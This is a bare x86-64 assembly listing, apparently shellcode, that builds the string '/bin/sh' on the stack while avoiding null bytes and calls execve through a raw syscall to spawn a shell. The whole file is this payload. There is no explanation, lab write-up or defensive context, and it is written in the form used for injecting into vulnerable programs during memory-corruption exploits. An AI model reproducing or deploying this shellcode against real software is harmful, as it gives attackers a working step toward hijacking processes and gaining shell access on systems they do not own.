global _start

section .text

_start:
	mov rax, 0x1168732f6e69622f ;
	shl rax, 0x8 ;
	shr rax, 0x8 ;
	push rax ;

	mov rax, 0x111111111111113b ;
	shl rax, 0x38 ;
	shr rax, 0x38 ;
	xor rdx, rdx ;
	xor rsi, rsi ;
	mov rdi, rsp  ;
	syscall;
